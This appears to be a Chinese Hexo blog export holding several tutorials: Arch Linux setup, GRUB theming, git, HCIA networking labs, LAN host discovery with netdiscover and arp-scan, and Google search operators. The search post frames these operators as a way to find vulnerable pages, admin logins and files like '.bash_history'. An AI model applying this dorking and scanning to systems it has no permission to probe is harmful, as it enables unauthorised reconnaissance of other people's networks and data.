<h2 id="10-配置系统默认编辑器"><a href="#10-配置系统默认编辑器" class="headerlink" title="10.配置系统默认编辑器"></a><a href="https://archlinuxstudio.github.io/ArchLinuxTutorial/#/rookie/DE&App?id=_10%E9%85%8D%E7%BD%AE%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E7%BC%96%E8%BE%91%E5%99%A8">10.配置系统默认编辑器</a></h2><p>默认情况下，Arch Linux 在一些终端编辑场景使用 vi 编辑器，但是我们使用 vim。如果不做一个额外配置，在 git 等场景下，在终端调用编辑器会出错。编辑~&#x2F;.bashrc 文件，加入如下内容，将 vim 设置为默认 EDITOR</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> EDITOR=<span class="string">&#x27;vim&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="11-启动蓝牙-若有"><a href="#11-启动蓝牙-若有" class="headerlink" title="11.启动蓝牙(若有)"></a><a href="https://archlinuxstudio.github.io/ArchLinuxTutorial/#/rookie/DE&App?id=_11%E5%90%AF%E5%8A%A8%E8%93%9D%E7%89%99%E8%8B%A5%E6%9C%89">11.启动蓝牙(若有)</a></h2><p>如果你有蓝牙设备，需要启用蓝牙服务。随后在系统设置中进行添加设备与连接即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> --now bluetooth</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linux系统</category>
      </categories>
      <tags>
        <tag>Arch</tag>
        <tag>Archlinux</tag>
      </tags>
  </entry>
  <entry>
    <title>Arch linux如何美化GRUB</title>
    <url>/2023/04/08/Archlinux%E5%A6%82%E4%BD%95%E7%BE%8E%E5%8C%96GRUB/</url>
    <content><![CDATA[<h1 id="Archlinux如何美化GRUB"><a href="#Archlinux如何美化GRUB" class="headerlink" title="Archlinux如何美化GRUB"></a>Archlinux如何美化GRUB</h1><p>玩了这么久的Arch,每次换主题都是在桌面、软件这些地方，朋友来用你电脑才能看到你美轮美奂的桌面，那么怎么让你朋友一开机能知道你是一个资深二次元呢？答案很简单，给我们的Archlinux的GRUB换个衣服就能做到。</p>
<p>我们可以来到下面这个网站寻找自己喜欢的GRUB主题:</p>
<p><a href="https://www.pling.com/browse?cat=109&ord=latest">PLING</a></p>
<p>本次使用的主题是<a href="https://www.pling.com/p/1526503/">The Quintessential Quintuplets GRUB Theme</a></p>
<p>首先，把安装包下载下来。</p>
<p><img src="/2023/04/08/Archlinux%E5%A6%82%E4%BD%95%E7%BE%8E%E5%8C%96GRUB/image-20230408203651056.png" alt="image-20230408203651056"></p>
<p>将压缩包解压</p>
<p><img src="/2023/04/08/Archlinux%E5%A6%82%E4%BD%95%E7%BE%8E%E5%8C%96GRUB/image-20230408203806670.png" alt="image-20230408203806670"></p>
<p>解压之后，我们需要进去目录里面，要进去多次，直到能看到图片为止</p>
<p><img src="/2023/04/08/Archlinux%E5%A6%82%E4%BD%95%E7%BE%8E%E5%8C%96GRUB/image-20230408203854175.png" alt="image-20230408203854175"></p>
<p><img src="/2023/04/08/Archlinux%E5%A6%82%E4%BD%95%E7%BE%8E%E5%8C%96GRUB/image-20230408204047142.png" alt="image-20230408204047142"></p>
<p><img src="/2023/04/08/Archlinux%E5%A6%82%E4%BD%95%E7%BE%8E%E5%8C%96GRUB/image-20230408210306115.png" alt="image-20230408210306115"></p>
<p>然后把这个文件夹内容全部拷贝到</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> -r . /usr/share/grub/themes/Nino/</span><br></pre></td></tr></table></figure>

<p>然后编辑</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/default/grub</span><br></pre></td></tr></table></figure>

<p>添加下面这行参数</p>
<p><img src="/2023/04/08/Archlinux%E5%A6%82%E4%BD%95%E7%BE%8E%E5%8C%96GRUB/image-20230408210607247.png" alt="image-20230408210607247"></p>
<p>最后，重新生成一次grub.cfg</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure>

<p>重启之后，就能看到新装扮的GRUB了。</p>
]]></content>
      <categories>
        <category>Linux系统</category>
      </categories>
      <tags>
        <tag>Arch</tag>
        <tag>Archlinux</tag>
      </tags>
  </entry>
  <entry>
    <title>Blackarch</title>
    <url>/2022/05/01/Blackarch/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="Blackarch"><a href="#Blackarch" class="headerlink" title="Blackarch"></a>Blackarch</h1><h3 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay -S netdiscover</span><br></pre></td></tr></table></figure>

<h4 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 这会无休止一直广播ARP</span></span><br><span class="line">sudo netdiscover </span><br><span class="line"><span class="comment"># -i 设置网卡</span></span><br><span class="line">sudo netdiscover -i wlan0</span><br><span class="line"><span class="comment"># -r 设置ip段</span></span><br><span class="line">sudo netdiscover -i wlan0 -r 192.168.1.0/24</span><br></pre></td></tr></table></figure>

<h3 id="arp-scan"><a href="#arp-scan" class="headerlink" title="arp-scan"></a>arp-scan</h3><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 我有blackarch的源，你懂的！！！</span></span><br><span class="line">[orange@orange ~]$ yay -Ss arp-scan</span><br><span class="line">aur/obs-time-warp-scan 0.1.6-3 (+0 0.00) </span><br><span class="line">    Time Warp Scan filter <span class="keyword">for</span> OBS Studio</span><br><span class="line">aur/arp-scan-git r304.af905ce-1 (+1 0.00) </span><br><span class="line">    The ARP Scanner</span><br><span class="line">blackarch/arp-scan 1.9.7-2 (337.6 KiB 1017.9 KiB) [blackarch blackarch-networking blackarch-scanner blackarch-fingerprint] </span><br><span class="line">    A tool that uses ARP to discover and fingerprint IP hosts on the <span class="built_in">local</span> network</span><br><span class="line">community/arp-scan 1.9.7-2 (337.6 KiB 1017.9 KiB) </span><br><span class="line">    A tool that uses ARP to discover and fingerprint IP hosts on the <span class="built_in">local</span> network</span><br><span class="line">[orange@orange ~]$ yay -S arp-scan</span><br></pre></td></tr></table></figure>

<h4 id="简单使用-1"><a href="#简单使用-1" class="headerlink" title="简单使用"></a>简单使用</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -l 使用本地网络段扫描</span></span><br><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure>





<h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h3>]]></content>
      <categories>
        <category>攻防</category>
      </categories>
      <tags>
        <tag>Arch</tag>
        <tag>Archlinux</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>git_学习</title>
    <url>/2022/07/19/Git%20%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="Git-配置"><a href="#Git-配置" class="headerlink" title="Git 配置"></a>Git 配置</h1><h3 id="查看git配置"><a href="#查看git配置" class="headerlink" title="查看git配置"></a>查看git配置</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config -l</span><br></pre></td></tr></table></figure>

<p><strong>查看系统配置</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --system --list</span><br></pre></td></tr></table></figure>

<p><strong>查看用户配置</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global --list</span><br></pre></td></tr></table></figure>

<p><strong>Git相关的配置文件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Git\etc\gitconfig    <span class="comment">#Git安装目录下的gitconfig --system  系统级</span></span><br><span class="line">C：\User\Administrator\.gitconfig   <span class="comment">#只适用于当前登录用户的配置 --global  全局</span></span><br></pre></td></tr></table></figure>

<h3 id="安装完Git必须配置用户名和邮箱"><a href="#安装完Git必须配置用户名和邮箱" class="headerlink" title="安装完Git必须配置用户名和邮箱"></a>安装完Git必须配置用户名和邮箱</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;名称&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;邮箱&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="本地仓库搭建"><a href="#本地仓库搭建" class="headerlink" title="本地仓库搭建"></a>本地仓库搭建</h3><p><strong>创建本地仓库有两种方法：一.创造全新的仓库，二.克隆远程仓库</strong></p>
<ul>
<li><strong>本地仓库搭建</strong></li>
</ul>
<p><strong>1.创建全新的仓库，需要用GIT管理的项目的根目录执行：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">在当前目录新创建一个Git代码库</span><br><span class="line">git init    <span class="comment">#初始化</span></span><br></pre></td></tr></table></figure>

<p><strong>2.执行完之后可以在项目目录多了一个.git目录，关于版本等的所以信息都在这个目录里面。</strong></p>
<ul>
<li><strong>克隆远程仓库</strong></li>
</ul>
<p><strong>1.另一种方式是克隆远程目录，就是将远程服务器上的仓库完全镜像到本地</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># git clone [url]</span></span><br></pre></td></tr></table></figure>

<p><strong>2.去gitee或者github上克隆一个测试！</strong></p>
<h3 id="git设置代理"><a href="#git设置代理" class="headerlink" title="git设置代理"></a>git设置代理</h3><p><strong>下面这个地址<code>192.168.0.102:8101</code>是我的旁路由代理</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global http.proxy <span class="string">&quot;http://192.168.0.102:8101&quot;</span></span><br><span class="line">git config --global https.proxy <span class="string">&quot;https://192.168.0.102:8101&quot;</span></span><br></pre></td></tr></table></figure>



]]></content>
  </entry>
  <entry>
    <title>Google搜索引擎的使用技巧</title>
    <url>/2022/07/19/Google%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h1 id="Google搜索引擎的使用技巧"><a href="#Google搜索引擎的使用技巧" class="headerlink" title="Google搜索引擎的使用技巧"></a>Google搜索引擎的使用技巧</h1><h3 id="一-垃圾话"><a href="#一-垃圾话" class="headerlink" title="一.垃圾话"></a>一.垃圾话</h3><p><strong>我们通常使用搜索引擎都是直接搜索自己想要的内容，正常情况下我们都是直接使用语言进行描述问题来进行搜索，然后搜索引擎也有特定的语法可以使用，熟练掌握搜索引擎的语法可以让你的搜索效率和准确率大幅度提升，当然我们学习这种技巧是为了寻找存在漏洞的页面，或者存在敏感信息的文件。</strong></p>
<h3 id="二-Google-常用语法说明"><a href="#二-Google-常用语法说明" class="headerlink" title="二.Google 常用语法说明"></a>二.Google 常用语法说明</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">site              <span class="comment">#指定域名,如：xuegod.cn</span></span><br><span class="line">inurl             <span class="comment">#URL中存在的关键字页面，如：admin_login.php、admin/login.php、manage.php、admin.asp、admin.php </span></span><br><span class="line">intext            <span class="comment">#网页内容里面的关键字,如：后台</span></span><br><span class="line">Filetype          <span class="comment">#指定文件类型</span></span><br><span class="line">intitle           <span class="comment">#网页标题中的关键字,如：后台登录、index.of、.bash_history </span></span><br><span class="line"><span class="built_in">link</span>              <span class="comment">#返回你所有的指定域名链接</span></span><br><span class="line">info              <span class="comment">#查找指定站点信息</span></span><br><span class="line">cache             <span class="comment">#搜索Google里面的内容缓存</span></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>HCIA</title>
    <url>/2022/07/17/HCIA/</url>
    <content><![CDATA[<h1 id="HCIA"><a href="#HCIA" class="headerlink" title="HCIA"></a>HCIA</h1><p>[toc]</p>
<h2 id="子网计算"><a href="#子网计算" class="headerlink" title="子网计算"></a>子网计算</h2><p><img src="/2022/07/17/HCIA/image-20230214194022895.png" alt="image-20230214194022895"></p>
<p><img src="/2022/07/17/HCIA/image-20230214194423029.png" alt="image-20230214194423029"></p>
<h3 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">4个部门 4个子网</span><br><span class="line">每个部门最多到50台主机 每个子网至少容纳50个主机地址</span><br><span class="line">借两位  主机数=62台</span><br><span class="line">192.168.100.0/24-&gt;26</span><br><span class="line"></span><br><span class="line">0        1~62        63</span><br><span class="line">64       65~126      127</span><br><span class="line">128      129~190     192</span><br><span class="line">192      193~254     255</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/17/HCIA/image-20230215000603724.png" alt="image-20230215000603724"></p>
<p>块（Block） &#x3D; 2^主机数位&#x3D;256-感兴趣掩码数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">如果生产部主机100台，销售部有50台，财务部有25台，客服部有12台，应该如何划分子网呢？</span><br><span class="line"></span><br><span class="line">生产部100台，至少保留7位主机位，最多借1位</span><br><span class="line"></span><br><span class="line">块=128</span><br><span class="line">生产部可以在下面两个子网二选一，假设选了子网1，那么子网1就不能参与下面其他部门的分割，只能使用子网2去分割。</span><br><span class="line"></span><br><span class="line">子网1：192.168.100.0/25</span><br><span class="line">子网2：192.168.100.128/25</span><br><span class="line"></span><br><span class="line">销售部50台，至少保留6位主机位，最多借两位</span><br><span class="line">块=64</span><br><span class="line"></span><br><span class="line">子网3：192.168.100.128/26</span><br><span class="line">子网4：192.168.100.192/26</span><br><span class="line"></span><br><span class="line">销售部25台，客服部有12台，至少保留5位主机位，最多借三位</span><br><span class="line">块=32</span><br><span class="line"></span><br><span class="line">子网5：192.168.100.192/27   销售部</span><br><span class="line">子网6：192.168.100.224/27   客服部</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>第1问：61.179.150.39&#x2F;28 子网号为多少，广播号为多少，可用IP地址范围是多少？</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">块=16</span><br><span class="line"></span><br><span class="line">？ X 块 = B &lt; 39</span><br><span class="line">? = 2 B = 32</span><br><span class="line">子网号32</span><br><span class="line">广播号47</span><br><span class="line">可用ip地址范围33 ~ 46</span><br></pre></td></tr></table></figure>

<p><strong>第2问:19.224.17.0&#x2F;17 可不可以配置在路由器的接口上?如果可以，是为什么，不可以又是为什么?</strong> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">块=128</span><br><span class="line"></span><br><span class="line">子网地址19.224.0.0/17</span><br><span class="line">19.2240.0~19.224.127.255</span><br><span class="line">可以</span><br></pre></td></tr></table></figure>

<p><strong>第3问:37.95.221.16&#x2F;5 和 41.222.221.16&#x2F;5 两个地址在不在同一个网段，能不能ping通?为什么?</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">块=8</span><br><span class="line">32.0.0.0/5 40.0.0.0/5 很明显不是同一个网段，ping不通</span><br></pre></td></tr></table></figure>

<p><strong>第4问:给出第3问的IP地址 37.95.221.16的子网号和广播号</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">块=128</span><br><span class="line"></span><br><span class="line">子网号32.0.0.0/5</span><br><span class="line">广播号39.255.255.255/5</span><br><span class="line">可以</span><br></pre></td></tr></table></figure>



<h2 id="回环网卡设置过程"><a href="#回环网卡设置过程" class="headerlink" title="回环网卡设置过程"></a>回环网卡设置过程</h2><h3 id="一-安装过程"><a href="#一-安装过程" class="headerlink" title="一.安装过程"></a>一.安装过程</h3><p><strong>1.找到”开始”选项，鼠标右击找到”设备管理器”,然后随便在空白处单击鼠标一下。</strong></p>
<p><img src="/2022/07/17/HCIA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(4).png" alt="屏幕截图(4)"></p>
<p><strong>2.鼠标单击菜单栏选项的”操作”选项，然后单击”添加过时硬件”，然后在”弹窗”选项单击”下一步”;在”你想向导做什么”选项里面选择”安装我手动从列表选择的硬件(高级)”，然后单击”下一步”;在”常见硬件类型”选择中选择”网络适配器”,然后单击”下一步”;然后在”厂商”选项中选择”Microsoft”,然后在”型号”选项中选择”Microsoft KM-TEST 环回适配器”，然后单击”下一步“，然后在单击一次”下一步”，系统就会按照选项按照网卡，等待”完成”选项出来后，单击”完成”选项即可完成配置。</strong></p>
<p><img src="/2022/07/17/HCIA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(5).png" alt="屏幕截图(5)"></p>
<p><img src="/2022/07/17/HCIA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(6).png" alt="屏幕截图(6)"></p>
<p><img src="/2022/07/17/HCIA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(7).png" alt="屏幕截图(7)"></p>
<p><img src="/2022/07/17/HCIA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(10).png" alt="屏幕截图(10)"></p>
<h3 id="二-检查过程"><a href="#二-检查过程" class="headerlink" title="二.检查过程"></a>二.检查过程</h3><p><strong>1.然后可以在”更改适配器选项中”找到”以太网”这张回环网卡</strong></p>
<p><img src="/2022/07/17/HCIA/image-20220118203530057.png" alt="image-20220118203530057"></p>
<p><strong>1.当然你也可以给这张网卡”重命名”,比如左上角那张”loop”网卡就是我上一次实验的回环网卡，接下来我会用”loop”网卡做实验（顺带说一句，回环网卡安装好后是必须要重启才能生效）</strong></p>
<h3 id="三-ensp配置回环实验"><a href="#三-ensp配置回环实验" class="headerlink" title="三.ensp配置回环实验"></a>三.ensp配置回环实验</h3><p><strong>1.接下来我用这个拓扑来做一次</strong></p>
<p><img src="/2022/07/17/HCIA/image-20220118235018574-1658238267503.png" alt="image-20220118235018574"></p>
<p><strong>2.首先，我们单拖一个云”Cloud”出来。然后”右击”鼠标选择”设置”。没开始配置前的设置是这样的，如下图:</strong></p>
<p><img src="/2022/07/17/HCIA/image-20220118205140449-1658238267503.png" alt="image-20220118205140449"></p>
<p><strong>3.我们首先在端口创建那里找到绑定信息”UDP”，然后单击右边的”增加”选项。然后，配置表就出现一行配置，如下图:</strong></p>
<p><img src="/2022/07/17/HCIA/image-20220118205410999-1658238267504.png" alt="image-20220118205410999"></p>
<p><strong>4.然后我们在端口创建那里找到绑定信息”loop”（我们创建的回环网卡，这里的回环网卡我更改了设备名，所以叫loop），然后单击右边的”增加”选项。然后，配置表就出现第二行配置，如下图:</strong></p>
<p><img src="/2022/07/17/HCIA/image-20220118205550165-1658238267504.png" alt="image-20220118205550165"></p>
<p><img src="/2022/07/17/HCIA/image-20220118205753084-1658238267504.png" alt="image-20220118205753084"></p>
<p><strong>5.然后我们看下方的”端口映射设置”，在”出”或者”入”端口设置里面选择一方的端口编号设置成为”2”,然后再勾选下方的”双向通道”，然后单击”增加”即可完成配置。</strong></p>
<p><img src="/2022/07/17/HCIA/image-20220118210211711-1658238267504.png" alt="image-20220118210211711"></p>
<p><strong>6.设置回环网卡ip为”1.0.0.2”,打开”网络设配器选项”找到目标网卡改就行了</strong></p>
<p><img src="/2022/07/17/HCIA/image-20220118210811144-1658238267504.png" alt="image-20220118210811144"></p>
<p><strong>7.给路由器刷入命令(记得开启路由器)</strong></p>
<p><img src="/2022/07/17/HCIA/image-20220118211028820-1658238267504.png" alt="image-20220118211028820"></p>
<p><strong>8.xshell测试路由器ip”1.0.0.1”是否可以ping通</strong></p>
<p><img src="/2022/07/17/HCIA/image-20220118210928564-1658238267504.png" alt="image-20220118210928564"></p>
<p>9.把服务命令刷入路由器，然后用xshell连接上去。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sys</span><br><span class="line">sys AR1</span><br><span class="line">int g0/0/0</span><br><span class="line">ip add 1.0.0.1 24</span><br><span class="line">q</span><br><span class="line">telnet server <span class="built_in">enable</span></span><br><span class="line">user-interface vty 0 4</span><br><span class="line">authentication-mode aaa</span><br><span class="line">q</span><br><span class="line">aaa</span><br><span class="line">local-user julintongxue password cipher 123.com</span><br><span class="line">local-user julintongxue privilege level 15</span><br><span class="line">local-user julintongxue service-type telnet</span><br><span class="line">display this</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/17/HCIA/image-20220118235856933-1658238267504.png" alt="image-20220118235856933"></p>
<p><img src="/2022/07/17/HCIA/image-20220118235920804-1658238267504.png" alt="image-20220118235920804"></p>
<table>
<thead>
<tr>
<th>认证 模式</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>AAA</td>
<td>登录时需要用户名和密码</td>
</tr>
<tr>
<td>Password</td>
<td>登录时只需要密码</td>
</tr>
</tbody></table>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dis telnet server status</span><br><span class="line">dis telnet server <span class="built_in">enable</span></span><br></pre></td></tr></table></figure>


<table>
<thead>
<tr>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>user-interface vty 0 4</td>
<td>进入vty配置模式</td>
</tr>
<tr>
<td>+ authentication-mode password&#x2F;aaa</td>
<td>配置认证模式</td>
</tr>
<tr>
<td>+ set authentication password cipher huawei</td>
<td>配置认证密码huawei</td>
</tr>
<tr>
<td>+ user privilege level 15</td>
<td>配置用户级别为15</td>
</tr>
<tr>
<td>user-interface maximum-vty 15</td>
<td>配置最大vty会话数量</td>
</tr>
<tr>
<td>aaa</td>
<td>进入aaa配置模式</td>
</tr>
<tr>
<td>+ local-user julintongxue password cipher huawei</td>
<td>创建julintongxue用户和huawei密码</td>
</tr>
<tr>
<td>+ local-user julintongxue privilege level 15</td>
<td>创建用户级别</td>
</tr>
<tr>
<td>+ local-user julintongxue service-type telnet</td>
<td>创建用户可用服务</td>
</tr>
</tbody></table>
<h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><h3 id="ospf综合实验"><a href="#ospf综合实验" class="headerlink" title="ospf综合实验"></a>ospf综合实验</h3><p><img src="/2022/07/17/HCIA/image-20230608003146657.png" alt="image-20230608003146657"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sys </span><br><span class="line">sys AR1</span><br><span class="line">int g0/0/0</span><br><span class="line">ip add 192.168.0.1 24</span><br><span class="line">ospf 1 router-id 1.1.1.1</span><br><span class="line">area 0</span><br><span class="line">net 192.168.0.0 0.0.0.255</span><br><span class="line">int g0/0/0</span><br><span class="line">ospf dr-pri 200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys </span><br><span class="line">sys AR2</span><br><span class="line">int g0/0/0</span><br><span class="line">ip add 192.168.0.2 24</span><br><span class="line">ospf 1 router-id 2.2.2.2</span><br><span class="line">area 0</span><br><span class="line">net 192.168.0.0 0.0.0.255</span><br><span class="line">int g0/0/0</span><br><span class="line">ospf dr-pri 100</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys </span><br><span class="line">sys AR3</span><br><span class="line">int g0/0/0</span><br><span class="line">ip add 192.168.0.3 24</span><br><span class="line">int s4/0/0</span><br><span class="line">ip add 34.0.0.3 8</span><br><span class="line">ospf authentication-mode md5 1 cipher julintongxue@gmail.com</span><br><span class="line">ospf 1 router-id 3.3.3.3</span><br><span class="line">area 0</span><br><span class="line">net 192.168.0.0 0.0.0.255</span><br><span class="line">net 34.0.0.0 0.255.255.255</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys </span><br><span class="line">sys AR6</span><br><span class="line">int g0/0/0</span><br><span class="line">ip add 192.168.0.6 24</span><br><span class="line">ospf 1 router-id 6.6.6.6</span><br><span class="line">area 0</span><br><span class="line">net 192.168.0.0 0.0.0.255</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys </span><br><span class="line">sys AR4</span><br><span class="line">int g0/0/1</span><br><span class="line">ip add 48.0.0.4 8</span><br><span class="line">ip route-static 0.0.0.0 0 48.0.0.8</span><br><span class="line">int s4/0/0</span><br><span class="line">ip add 34.0.0.4 8</span><br><span class="line">ospf authentication-mode md5 1 cipher julintongxue@gmail.com</span><br><span class="line">int lo 4</span><br><span class="line">ip add 4.4.4.4 32</span><br><span class="line">ospf 1 router-id 4.4.4.4</span><br><span class="line">default-route-advertise</span><br><span class="line">area 0</span><br><span class="line">net 4.4.4.4 0.0.0.0</span><br><span class="line">net 34.0.0.0 0.255.255.255</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys </span><br><span class="line">sys AR5</span><br><span class="line">int g0/0/0</span><br><span class="line">ip add 48.0.0.8 8</span><br><span class="line">ip route-static 0.0.0.0 0 48.0.0.4</span><br><span class="line">int lo 5</span><br><span class="line">ip add 8.8.8.8 32</span><br></pre></td></tr></table></figure>

<h3 id="VLAN“基础实验”"><a href="#VLAN“基础实验”" class="headerlink" title="VLAN“基础实验”"></a>VLAN“基础实验”</h3><p><img src="/2022/07/17/HCIA/image-20230613001021890.png" alt="image-20230613001021890"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sys</span><br><span class="line">sys SW1</span><br><span class="line">vlan batch 10 20 100 200</span><br><span class="line">int g0/0/3</span><br><span class="line">p l t</span><br><span class="line">p t a v 10 20 100 200</span><br><span class="line">int g0/0/1</span><br><span class="line">p l h</span><br><span class="line">p h un v 10 100</span><br><span class="line">p h p v 10</span><br><span class="line">int g0/0/2</span><br><span class="line">p l h</span><br><span class="line">p h un v 20 200</span><br><span class="line">p h p v 20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys</span><br><span class="line">sys SW2</span><br><span class="line">vlan batch 10 20 100 200</span><br><span class="line">int g0/0/1</span><br><span class="line">p l t</span><br><span class="line">p t a v 10 20 100 200</span><br><span class="line">int g0/0/2</span><br><span class="line">p l t</span><br><span class="line">p t a v 10 20 100 200</span><br><span class="line">int g0/0/3</span><br><span class="line">p l h</span><br><span class="line">p h un v 10 100</span><br><span class="line">p h p v 100</span><br><span class="line">int g0/0/4</span><br><span class="line">p l h</span><br><span class="line">p h un v 20 200</span><br><span class="line">p h p v 200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys</span><br><span class="line">sys SW3</span><br><span class="line">vlan batch 10 20 100 200</span><br><span class="line">int g0/0/4</span><br><span class="line">p l t</span><br><span class="line">p t a v 10 20 100 200</span><br><span class="line">int g0/0/1</span><br><span class="line">p l h</span><br><span class="line">p h un v 10 100</span><br><span class="line">p h p v 10</span><br><span class="line">int g0/0/2</span><br><span class="line">p l h</span><br><span class="line">p h un v 20 200</span><br><span class="line">p h p v 20</span><br></pre></td></tr></table></figure>

<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><h3 id="交换机划分VLAN配置"><a href="#交换机划分VLAN配置" class="headerlink" title="交换机划分VLAN配置"></a>交换机划分VLAN配置</h3><h4 id="一、实验目标"><a href="#一、实验目标" class="headerlink" title="一、实验目标"></a>一、实验目标</h4><p><strong>1、理解虚拟LAN(VLAN)基本配置；</strong></p>
<p><strong>2、掌握一般交换机按端口划分VLAN的配置方法；</strong></p>
<p><strong>3、掌握Tag VLAN配置方法。</strong></p>
<h4 id="二、实验背景"><a href="#二、实验背景" class="headerlink" title="二、实验背景"></a>二、实验背景</h4><p><strong>某一公司内财务部、销售部的PC通过2台交换机实现通信；要求财务部和销售部的PC可以互通，但为了数据安全起见，销售部和财务部需要进行互相隔离，现要在交换机上做适当配置来实现这一目标。</strong></p>
<h4 id="三、技术原理"><a href="#三、技术原理" class="headerlink" title="三、技术原理"></a>三、技术原理</h4><p>​	<strong>VLAN是指在一个物理网段内。进行逻辑的划分，划分成若干个虚拟局域网，VLAN做大的特性是不受物理位置的限制，可以进行灵活的划分。VLAN具备了一个物理网段所具备的特性。相同VLAN内的主机可以相互直接通信，不同VLAN间的主机之间互相访问必须经路由设备进行转发，广播数据包只可以在本VLAN内进行广播，不能传输到其他VLAN中。</strong></p>
<p>​	<strong>Port VLAN是实现VLAN的方式之一，它利用交换机的端口进行VALN的划分，一个端口只能属于一个VLAN。</strong><br>​	<strong>Tag VLAN是基于交换机端口的另一种类型，主要用于是交换机的相同Vlan内的主机之间可以直接访问，同时对不同Vlan的主机进行隔离。Tag VLAN遵循IEEE802.1Q协议的标准，在使用配置了Tag VLAN的端口进行数据传输时，需要在数据帧内添加4个字节的802.1Q标签信息，用于标示该数据帧属于哪个VLAN,便于对端交换机接收到数据帧后进行准确的过滤。</strong></p>
<h4 id="四、实验设备"><a href="#四、实验设备" class="headerlink" title="四、实验设备"></a>四、实验设备</h4><p><strong>PC1,PC2,PC3,PC4</strong></p>
<p><strong>两台S5700交换机</strong></p>
<h4 id="五、实验的步骤和结果"><a href="#五、实验的步骤和结果" class="headerlink" title="五、实验的步骤和结果"></a>五、实验的步骤和结果</h4><p><img src="/2022/07/17/HCIA/image-20221224163323380.png" alt="image-20221224163323380"></p>
<p><strong>结果就是PC1ping通PC3，PC2ping通PC4，PC1和PC3都不能访问PC2和PC4</strong></p>
<p><img src="/2022/07/17/HCIA/image-20221224163549970.png" alt="image-20221224163549970"></p>
<p><img src="/2022/07/17/HCIA/image-20221224163612934.png" alt="image-20221224163612934"></p>
